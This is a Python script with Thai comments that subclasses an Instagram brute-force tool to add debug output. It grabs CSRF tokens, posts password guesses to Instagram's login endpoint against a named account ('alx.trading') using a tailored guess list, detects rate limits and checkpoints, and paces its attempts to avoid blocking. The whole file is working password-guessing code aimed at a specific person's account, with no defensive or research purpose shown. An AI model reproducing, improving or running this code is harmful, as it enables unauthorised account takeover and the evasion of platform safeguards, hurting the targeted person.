#!/usr/bin/env python3
"""
Debug Logger สำหรับ Instagram Brute Force
แสดงรายละเอียดของแต่ละ attempt ว่าเกิดอะไรขึ้น
"""

from bruteforce_ig_clean import AdvancedInstagramBruteForcer
import sys
sys.path.append('/workspaces/sugarglitch-realops/scripts')


class DebugInstagramBruteForcer(AdvancedInstagramBruteForcer):
    """Enhanced version with detailed debugging"""

    def attempt_login_secure(self, password, attempt_number):
        """Enhanced login attempt with detailed debugging"""
        print(f"\n🔍 ATTEMPT #{attempt_number + 1}: {password}")
        print("=" * 50)

        try:
            # Step 1: Get session
            print("📡 Step 1: Getting session...")
            session = self.get_session()
            print(f"✅ Session obtained: {type(session).__name__}")

            # Step 2: Get CSRF token
            print("🔑 Step 2: Extracting CSRF token...")
            csrf_token = self.get_csrf_token(session)

            if not csrf_token:
                print("❌ CSRF token extraction FAILED")
                return False

            print(f"✅ CSRF token obtained: {csrf_token[:20]}...")

            # Step 3: Check what we can extract from the page
            print("🌐 Step 3: Analyzing Instagram login page...")
            try:
                headers = self.get_advanced_headers()
                response = session.get('https://www.instagram.com/accounts/login/',
                                       headers=headers, timeout=15)
                print(f"✅ Login page status: {response.status_code}")

                # Check for rate limiting indicators
                if 'rate' in response.text.lower() or 'limit' in response.text.lower():
                    print("⚠️ Possible rate limiting detected in page")

                # Check for challenge/checkpoint
                if 'challenge' in response.text.lower() or 'checkpoint' in response.text.lower():
                    print("🔒 Challenge/checkpoint detected in page")

            except Exception as e:
                print(f"⚠️ Page analysis error: {e}")

            # Step 4: Perform login attempt
            print("🎯 Step 4: Performing login attempt...")
            result = self.web_login(session, password, csrf_token)

            # Step 5: Analyze result
            print("📊 Step 5: Result analysis...")
            if result is True:
                print("🎉 LOGIN SUCCESS!")
            elif result is None:
                print("⏳ RATE LIMITED or CHECKPOINT")
            elif result is False:
                print("❌ LOGIN FAILED (Wrong password)")
            else:
                print(f"❓ UNKNOWN RESULT: {result}")

            # Update statistics
            self.total_attempts += 1
            if result is False:
                self.failed_attempts += 1

            # Step 6: Adaptive delay
            print("⏱️ Step 6: Applying adaptive delay...")
            self.adaptive_delay()

            return result

        except Exception as e:
            print(f"💥 CRITICAL ERROR in attempt #{attempt_number + 1}: {e}")
            return False

    def web_login(self, session, password, csrf_token):
        """Enhanced web login with detailed debugging"""
        print(f"🔐 Attempting web login with password: {password}")

        try:
            headers = self.get_advanced_headers('web')
            headers['X-CSRFToken'] = csrf_token
            headers['X-Instagram-AJAX'] = '1006179778'

            print(f"📋 Headers prepared: {len(headers)} headers")

            # Enhanced login payload
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(__import__("time").time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}',
                'stopDeletionNonce': '',
                'isFromLogin': 'true'
            }

            print(f"📦 Payload prepared for user: {self.target_username}")
            print(f"🔒 Encrypted password format: PWD_INSTAGRAM_BROWSER")

            # Make the request
            print("🚀 Sending login request...")
            response = session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=20,
                allow_redirects=False
            )

            print(f"📡 Response status: {response.status_code}")
            print(f"📏 Response length: {len(response.text)} characters")

            # Debug response content (first 200 chars)
            response_preview = response.text[:200].replace('\n', ' ')
            print(f"👀 Response preview: {response_preview}...")

            return self.analyze_response(response, password, 'web')

        except Exception as e:
            print(f"💥 Web login error for {password}: {e}")
            return False

    def analyze_response(self, response, password, method):
        """Enhanced response analysis with debugging"""
        print(f"🔍 Analyzing response for {password}...")

        try:
            status_code = response.status_code
            response_text = response.text.lower()

            print(f"📊 Status Code: {status_code}")

            # Success indicators
            success_indicators = [
                'authenticated', '"status":"ok"', 'logged_in_user', 'sessionid'
            ]

            # Rate limit indicators
            rate_limit_indicators = [
                'rate_limited', 'please wait', 'too many requests', 'spam', 'try again later'
            ]

            # Checkpoint indicators
            checkpoint_indicators = [
                'checkpoint_required', 'challenge_required', 'two_factor_required', 'verification'
            ]

            # Check each category
            found_success = [
                ind for ind in success_indicators if ind in response_text]
            found_rate_limit = [
                ind for ind in rate_limit_indicators if ind in response_text]
            found_checkpoint = [
                ind for ind in checkpoint_indicators if ind in response_text]

            print(f"✅ Success indicators found: {found_success}")
            print(f"⏳ Rate limit indicators found: {found_rate_limit}")
            print(f"🔒 Checkpoint indicators found: {found_checkpoint}")

            # Check for specific patterns
            if '"status":"fail"' in response_text:
                print("❌ Status: FAIL detected")
            if '"status":"ok"' in response_text:
                print("✅ Status: OK detected")
            if 'incorrect_password' in response_text:
                print("🔑 Incorrect password detected")
            if 'user_id' in response_text:
                print("👤 User ID found in response")

            # Determine result
            if found_success:
                print(f"🎯 SUCCESS! Password: {password}")
                self.found_password = password
                return True
            elif found_rate_limit:
                print(f"⏳ RATE LIMITED for: {password}")
                self.rate_limited_count += 1
                return None
            elif found_checkpoint:
                print(f"🔒 CHECKPOINT for: {password}")
                self.checkpoint_count += 1
                return False
            else:
                print(f"❌ FAILED: {password}")
                return False

        except Exception as e:
            print(f"⚠️ Response analysis error: {e}")
            return False


def test_specific_passwords():
    """Test specific passwords with debug output"""
    print("🔥 DEBUG INSTAGRAM BRUTE FORCE TESTER")
    print("=====================================")

    target_username = "alx.trading"

    # Test passwords (including the one from attempt 56)
    test_passwords = [
        "Fleming654",      # Common pattern
        "alxtrading123",   # Username based
        "AlexTrading2024",  # Professional looking
        "Trading123!",     # With special char
        "whatilove1728"    # Second target name
    ]

    print(f"🎯 Target: {target_username}")
    print(f"🔑 Testing {len(test_passwords)} passwords with full debug...")
    print("=" * 60)

    # Create debug brute forcer
    bf = DebugInstagramBruteForcer(
        target_username=target_username,
        password_list=test_passwords
    )

    # Test each password with full debugging
    for i, password in enumerate(test_passwords):
        print(f"\n{'='*60}")
        print(f"🧪 DEBUG TEST {i+1}/{len(test_passwords)}")
        print(f"{'='*60}")

        result = bf.attempt_login_secure(password, i)

        if result is True:
            print("🎉 PASSWORD FOUND! Stopping test.")
            break

        print(f"\nResult for '{password}': {result}")
        print("Waiting 5 seconds before next test...")
        __import__("time").sleep(5)

    print(f"\n{'='*60}")
    print("🏁 DEBUG TEST COMPLETED")
    print(f"{'='*60}")


if __name__ == "__main__":
    test_specific_passwords()
